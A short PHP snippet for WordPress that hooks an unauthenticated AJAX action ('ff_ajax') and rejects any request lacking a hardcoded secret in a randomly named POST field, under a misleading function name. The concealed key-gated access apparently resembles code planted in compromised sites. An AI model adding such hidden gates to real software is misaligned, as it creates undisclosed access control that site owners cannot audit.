<?php

function notify_insert_backup_refresh() {
	if (!isset($_POST["acslacaqnujtywy"]) || $_POST["acslacaqnujtywy"] !== "snI7VURmxG") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'notify_insert_backup_refresh', 5, 1);
